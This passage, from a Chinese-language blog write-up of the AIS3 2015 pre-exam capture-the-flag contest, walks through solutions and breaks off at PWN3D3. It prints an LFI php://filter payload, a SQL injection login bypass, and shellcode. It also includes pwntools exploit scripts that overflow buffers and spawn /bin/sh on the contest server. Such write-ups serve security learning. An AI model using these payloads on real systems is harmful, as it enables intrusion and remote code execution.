@@ -1,0 +1,928 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,Pwnable,Python,Web,Misc,PPC,Crypto,C,format_string,AIS3,Reversing," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hacking Tube 2.0" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="考量到參與 AIS3 2015 pre-exam 的人幾乎都是台灣人這個 blog 的第一篇中文 writeup 就獻給這篇了 XD基本上就是全包這次 exam 的所有題目有問題歡迎留言討論">
+<meta name="keywords" content="CTF,Pwnable,Python,Web,Misc,PPC,Crypto,C,format_string,AIS3,Reversing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3 2015 pre-exam -- complete writeup">
+<meta property="og:url" content="https://bruce30262.github.io/2015/08/06/2015-08-06-ais3-2015-pre-exam-complete-writeup/index.html">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:description" content="考量到參與 AIS3 2015 pre-exam 的人幾乎都是台灣人這個 blog 的第一篇中文 writeup 就獻給這篇了 XD基本上就是全包這次 exam 的所有題目有問題歡迎留言討論">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-01-03T15:08:05.595Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="AIS3 2015 pre-exam -- complete writeup">
+<meta name="twitter:description" content="考量到參與 AIS3 2015 pre-exam 的人幾乎都是台灣人這個 blog 的第一篇中文 writeup 就獻給這篇了 XD基本上就是全包這次 exam 的所有題目有問題歡迎留言討論">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://bruce30262.github.io/2015/08/06/2015-08-06-ais3-2015-pre-exam-complete-writeup/"/>
+
+
+
+
+
+  <title>AIS3 2015 pre-exam -- complete writeup | Hacking Tube 2.0</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-100090256-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hacking Tube 2.0</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Security and stuff.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://bruce30262.github.io/2015/08/06/2015-08-06-ais3-2015-pre-exam-complete-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bruce Chen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hacking Tube 2.0">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">AIS3 2015 pre-exam -- complete writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2015-08-06T12:15:00+08:00">
+                2015-08-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index">
+                    <span itemprop="name">write-ups</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2015/08/06/2015-08-06-ais3-2015-pre-exam-complete-writeup/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2015/08/06/2015-08-06-ais3-2015-pre-exam-complete-writeup/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>views
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>考量到參與 AIS3 2015 pre-exam 的人幾乎都是台灣人<br>這個 blog 的第一篇中文 writeup 就獻給這篇了 XD<br>基本上就是全包這次 exam 的所有題目<br>有問題歡迎留言討論</p>
+<a id="more"></a>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h2><p>沒啥特別，範例 flag <code>AIS3{hello_world}</code></p>
+<h2 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h2><p>給了一個 facebook.zip，有密碼<br>老實說我最討厭這種需要解壓縮檔密碼的題目 = =<br>每次打 CTF 遇到這類型題目沒有一次解出來過 = =<br>也因此是我卡最久的一題</p>
+<p>之後才知道說要用到一種攻擊叫做 <strong>known plaintext attack</strong><br>給定一個加密過的檔案，可以利用原檔案進行攻擊解密出 key<br>網路上還有 tool 可以解，叫 <a href="https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html" target="_blank" rel="noopener">pkcrack</a></p>
+<p>因為壓縮檔裡面有張加密過的圖片<br>所以可以根據檔名，想辦法 google 到原圖<br>然後根據 pkcrack 官方網站裡面的 document 說明來進行解密<br>基本上就是將原圖也壓成一個 zip 檔<br>之後用 pkcrack 解出 <code>key0</code>, <code>key1</code> 和 <code>key2</code><br>最後用裡面附的 <code>zipdecrypt</code> 來解出壓縮檔裡面所有的檔案，就可以拿到 flag 了<br>flag: <code>AIS3{old_trick_fool_the_zip_password}</code></p>
+<h2 id="MISC3"><a href="#MISC3" class="headerlink" title="MISC3"></a>MISC3</h2><p>Orange 說 MISC3 出錯了 (´・ω・`)<br>導致這題比 MISC2 還要簡單 XD<br>給了個壓縮檔，解出來後是張白白的圖片<br>乍看之下沒什麼，不過剛好那時我的筆電螢幕有傾斜，看出了色差<br>所以直接看出了 flag XD<br>flag: <code>AIS3{picture_in_picture_0xcc}</code></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>連進去試了幾下之後發現是 LFI 的漏洞<br>之後就一直嘗試繞過字串過濾的限制<br>然後就卡住了 = =<br>最後才發現是要用 <code>PHP I/O stream</code> 的 <code>php://filter</code> 來將 index.php 的內容轉成 base64 encode 然後 dump 出來<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[HOST]/web1/?page=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>
+<p>這東西算是打 WEB 的基本 trick<br>對於 web 苦手的我來說算是長知識了<br>flag: <code>AIS3{php_wrapper_rocks}</code></p>
+<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>給了我們一個 .txt 檔<br>一看就知道跟 javascript 有關<br>可是一直想不起來它的名字 = =<br>google了好久之後才查到它叫 <a href="http://www.jsfuck.com/" target="_blank" rel="noopener">jsfuck</a>  </p>
+<p>之後就簡單許多了，直接 google jsfuck decoder 就可以有現成的 code 可以解了<br>(聽說可以用 Firefox 秒解)<br>flag: <code>AIS3{fuck_the_javascript_interpreter}</code></p>
+<h2 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h2><p>這次 exam 唯一沒有解出來的一題<br>原因也很簡單，就是 web 實力太弱，知道的 trick 不夠多 ( web 真的很吃 trick 啊…)  </p>
+<p>總之就是一個有登入頁面跟顯示新聞頁面的網站<br>顯示新聞頁面的 URL 有吃 get 參數<br>所以就先用 <a href="http://sqlmap.org/" target="_blank" rel="noopener">sqlmap</a> 掃一下<br>發現沒洞 ( sqlmap 回報說參數應是有用<code>int()</code>擋掉 SQL injection )  </p>
+<p>之後就是不斷的嘗試別的思路<br>包括從登入頁面那邊用 SQL injection 打進去<br>可惜知道的 trick (應該說是 payload format ) 不夠多<br>導致試到 exam 結束時都沒有試出來  </p>
+<p>之後向 Orange 問了解法以及解題思路，他是這麼回答的:  </p>
+<blockquote>
+<p>其實只要在登入頁面的 username 欄位那邊<br>輸入 <code>aaaaa\</code><br>就會發現 database error<br>如此一來就可以推斷出網站沒有濾 <code>\</code> 字元<br>剩下的就是構造 payload</p>
+</blockquote>
+<p>看到這邊，其實還是不是很了解<br>主要的原因是因為我一直以為”過濾”<code>&#39;</code>字元的意思是說直接把<code>&#39;</code>取代成空字串<br>但是在問過學長之後，發現其實不是這樣子的  </p>
+<p>身為一個 web service<br>通常不會把一個使用者的 input 做任意的修改 (包括砍掉其中的字元)<br>而是會嘗試將所有的 input 都送進 database 裡面<br>因此在遇到<code>&#39;</code>字元的時候，通常會利用反斜線來 escape 掉，也就是變成 <code>\&#39;</code><br>這樣子的行為也可以是一種”過濾”</p>
+<p>那麼因為網站沒有過濾反斜線，只有過濾<code>&#39;</code><br>因此我們在 username 那欄可以這麼輸入: <code>aaa\&#39; OR 1=1 #</code><br>這個時候，因為網站過濾<code>&#39;</code>但沒有過濾<code>\</code>的關係，使得 username 的 data 將會變成 <code>aaa\\&#39; OR 1=1 #</code><br>塞進 SQL 做 query 時就會變成:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> [table_name] <span class="keyword">WHERE</span> username = <span class="string">'aaa\\'</span> <span class="keyword">OR</span> <span class="number">1</span>=<span class="number">1</span> #<span class="string">' AND password = ''</span></span><br></pre></td></tr></table></figure></p>
+<p>如此一來就可以繞過檢查，成功登入(登入之後就會看到 flag 了)</p>
+<h1 id="BINARY"><a href="#BINARY" class="headerlink" title="BINARY"></a>BINARY</h1><h2 id="BINARY1"><a href="#BINARY1" class="headerlink" title="BINARY1"></a>BINARY1</h2><p>拿到 binary 之後也沒多想<br>直接 <code>strings</code> 下下去<br>發現有噴出 <code>AIS3{strings_help_you_a_lot_isnt}</code><br>直接拿來 submit，瘋狂噴錯 = =<br>最後腦補成 <code>AIS3{strings_help_you_a_lot_isnt_it}</code>就過了…</p>
+<h2 id="BINARY2"><a href="#BINARY2" class="headerlink" title="BINARY2"></a>BINARY2</h2><p>給了一份文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\x48\xb8\xb5\xa3\xb9\xb1\xc6\x41</span><br><span class="line">\x41\x41\x50\x48\xb8\xbc\xa0\xa9</span><br><span class="line">\x93\xaa\xa3\xbe\x93\x50\x48\xb8</span><br><span class="line">\xa9\x93\xa5\xbf\x93\xbf\xa5\xa1</span><br><span class="line">\x50\x48\xb8\xbf\xa4\xa9\xa0\xa0</span><br><span class="line">\xaf\xa3\xa8\x50\x48\xb8\x8d\x85</span><br><span class="line">\x9f\xff\xb7\xa3\xa7\x93\x50\x48</span><br><span class="line">\x89\xe6\x48\x31\xd2\x80\x34\x16</span><br><span class="line">\xcc\xfe\xc2\x80\xfa\x25\x75\xf5</span><br><span class="line">\x48\x31\xc0\x48\xff\xc0\x48\x89</span><br><span class="line">\xc7\x0f\x05\x6a\x3c\x58\x48\x31</span><br><span class="line">\xff\x0f\x05</span><br></pre></td></tr></table></figure></p>
+<p>一開始還以為 decode hex 之後會是一種檔案格式<br>結果發現不是，就卡了一段時間<br>之後腦洞打開想說會不會是 shellcode<br>看了一下 hex value 又覺得應該不是 x86 的 machine code<br>於是就直接寫了個 .c 檔編成 64 bit ELF 直接下去跑<br><figure class="highlight c"><figcaption><span>shell.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> code[] = <span class="string">"\x48\xb8\xb5\xa3\xb9\xb1\xc6\x41\x41\x41\x50\x48\xb8\xbc\xa0\xa9\x93\xaa\xa3\xbe\x93\x50\x48\xb8\xa9\x93\xa5\xbf\x93\xbf\xa5\xa1\x50\x48\xb8\xbf\xa4\xa9\xa0\xa0\xaf\xa3\xa8\x50\x48\xb8\x8d\x85\x9f\xff\xb7\xa3\xa7\x93\x50\x48\x89\xe6\x48\x31\xd2\x80\x34\x16\xcc\xfe\xc2\x80\xfa\x25\x75\xf5\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> (*func)();</span><br><span class="line">	func = (<span class="keyword">int</span> (*)()) code;</span><br><span class="line">	(<span class="keyword">int</span>)(*func)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bruce30262@ubuntu:~/Desktop/shellcode$ gcc -z execstack -o shell shell.c</span><br><span class="line">bruce30262@ubuntu:~/Desktop/shellcode$ ./shell</span><br><span class="line">AIS3&#123;ok_shellcode_is_simple_for_you&#125;</span><br></pre></td></tr></table></figure>
+<p>難怪叫做 sc.txt, SC 就是 shellcode 的縮寫嘛 XD<br>收工!<br>flag:<code>AIS3{ok_shellcode_is_simple_for_you}</code> </p>
+<h2 id="BINARY3"><a href="#BINARY3" class="headerlink" title="BINARY3"></a>BINARY3</h2><p>一開始給了一個叫做 stupid 的 binary<br>64 bit ELF，有 strip 過<br>那個時候想說要 reverse 覺得好麻煩就先去睡覺了XD<br>結果第二天發了第二個版本 stupid_v2，裡面保留了所有的 symbol 資訊<br>瞬間變得超級友善XDD<br>直接丟進 IDA Pro 做靜態分析就足以把 key 解出來了</p>
+<p>簡單來說程式會要你輸入input<br>然後會做兩次檢查( check1 和 check2 )，如果都通過的話就代表你輸入的 input 就是 flag<br>雖然說是做兩次檢查，但是因為 check1 和 check2 之間 input 沒有被動到<br>且兩者之間毫無關聯性，因此可以推得只要過得了 check2 就一定過得了 check1<br>那麼 check1 似乎就不是那麼重要了，重點擺在 check2 即可</p>
+<p>而 check2 的檢查也十分簡單:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; key = 0xDDDDAAAADADADDAA ^ (our_input)</span><br><span class="line">cmp     dword ptr key, 0BFB7B8CEh</span><br><span class="line">setz    al</span><br><span class="line">cmp     dword ptr key+4, 0BCB4DEC4h</span><br><span class="line">setz    ah</span><br><span class="line">xor     ax, 101h</span><br></pre></td></tr></table></figure></p>
+<p>也就是說，只要我們的 input  xor  <code>0xDDDDAAAADADADDAA</code> == <code>0xBCB4DEC4BFB7B8CE</code> 的話<br>就代表著我們的 input = flag<br>而 xor 的反解也相當簡單，即再做一次 xor 即可<br>因此 flag = <code>0xDDDDAAAADADADDAA ^ 0xBCB4DEC4BFB7B8CE</code> = <code>0x6169746E656D6564</code><br>之後轉成 ascii code, endianness 注意一下，即可得到正確的 input = <code>dementia</code><br>flag: <code>AIS3{dementia}</code></p>
+<h1 id="PWN3D"><a href="#PWN3D" class="headerlink" title="PWN3D"></a>PWN3D</h1><p>( pwn 的 flag 全忘光了，這邊就純分享解法 &amp; payload 囉 )</p>
+<h2 id="PWN3D1"><a href="#PWN3D1" class="headerlink" title="PWN3D1"></a>PWN3D1</h2><p>64 bit ELF, 直接丟進 IDA Pro 就會看到邪惡的 <code>scanf()</code> 和一個看起來就是要你蓋它的變數<br>分析了一下，發現只要將那個變數蓋成 <code>0x90909090</code> 就會噴 flag<br>計算好 offset 之後就可以構造 payload 丟給 server 了<br>一開始直接用 <code>python -c</code> pipe 進 nc 的方式送<br>不知道為什麼一直沒有噴 flag 回來<br>最後只好乖乖寫 script<br><figure class="highlight python"><figcaption><span>pwn1.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"52.69.163.194"</span></span><br><span class="line">PORT = <span class="number">1111</span></span><br><span class="line">ELF_PATH = <span class="string">""</span></span><br><span class="line">LIBC_PATH = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment">#elf = ELF(ELF_PATH)</span></span><br><span class="line"><span class="comment">#libc = ELF(LIBC_PATH)</span></span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"A"</span>*<span class="number">28</span> + <span class="string">"\x90\x90\x90\x90"</span> </span><br><span class="line">    <span class="keyword">print</span> r.recvuntil(<span class="string">"name: \n"</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="keyword">print</span> r.recv(<span class="number">1024</span>)</span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure></p>
+<h2 id="PWN3D2"><a href="#PWN3D2" class="headerlink" title="PWN3D2"></a>PWN3D2</h2><p>32 bit ELF, 單純的 echo server，輸入啥 input 就印啥出來(嗎?)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">echo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+18h] [bp-14h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+1Ch] [bp-10h]@1</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  read(<span class="number">0</span>, &amp;v1, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="keyword">return</span> __printf_chk(<span class="number">1</span>, &amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到 <code>read()</code> 那邊有個 overflow 的漏洞<br>然後 <code>__printf_chk()</code> 那邊也有個 format string 的漏洞</p>
+<p>使用 <a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="noopener">checksec.sh</a> 檢查之後發現沒開 DEP<br>那麼方向就很明顯了: return to shellcode<br>先利用 format string leak 出 ebp, 得到目前 stack 的位置，並計算 input buffer 的 address<br>透過第一次 overflow 覆寫 return address，讓程式執行完 <code>echo()</code> 之後重新回到 <code>echo()</code> 的開頭<br>此時我們拿到了 input buffer 的 address<br>就可以在 buffer 上面塞 shellcode<br>並透過第二次的 overflow 讓 return address 跳到我們的 shellcode 上面執行拿到 shell  </p>
+<p>要注意的是 buffer 只給我們 20 byte, 而我的 shellcode 有 23 byte<br>因此最後我是將 shellcode 塞在 return address 後面，並向後跳至 shellcode 位址執行<br><figure class="highlight python"><figcaption><span>pwn2.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"52.69.163.194"</span></span><br><span class="line">PORT = <span class="number">2222</span></span><br><span class="line">ELF_PATH = <span class="string">""</span></span><br><span class="line">LIBC_PATH = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment">#elf = ELF(ELF_PATH)</span></span><br><span class="line"><span class="comment">#libc = ELF(LIBC_PATH)</span></span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"><span class="comment">#r = process("./pwn2")</span></span><br><span class="line">shellcode_byte = [ <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x2f</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x68</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x89</span>, <span class="number">0xe3</span>, <span class="number">0xb0</span>, <span class="number">0x0b</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xcd</span>, <span class="number">0x80</span> ]</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">''</span>.join( chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> shellcode_byte)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">	echo_start = <span class="number">0x08048540</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak ebp</span></span><br><span class="line">	payload = <span class="string">"%p."</span>*<span class="number">3</span></span><br><span class="line">	payload = payload.ljust(<span class="number">20</span>, <span class="string">"A"</span>)</span><br><span class="line">	payload += p32(echo_start)</span><br><span class="line">	r.sendline(payload)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># calculate buffer address</span></span><br><span class="line">	resp = r.recv(<span class="number">1024</span>).split(<span class="string">"."</span>)[<span class="number">2</span>]</span><br><span class="line">	ret_addr = int(resp, <span class="number">16</span>) - <span class="number">0x30</span> + <span class="number">28</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># return to shellcode</span></span><br><span class="line">	payload = <span class="string">"A"</span>*<span class="number">20</span></span><br><span class="line">	payload += p32(ret_addr)</span><br><span class="line">	payload += <span class="string">"\x90"</span>*<span class="number">10</span> + shellcode</span><br><span class="line">	r.sendline(payload)</span><br><span class="line">	r.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="PWN3D3"><a href="#PWN3D3" class="headerlink" title="PWN3D3"></a>PWN3D3</h2><p>32 bit ELF, 一樣沒開 DEP</p>
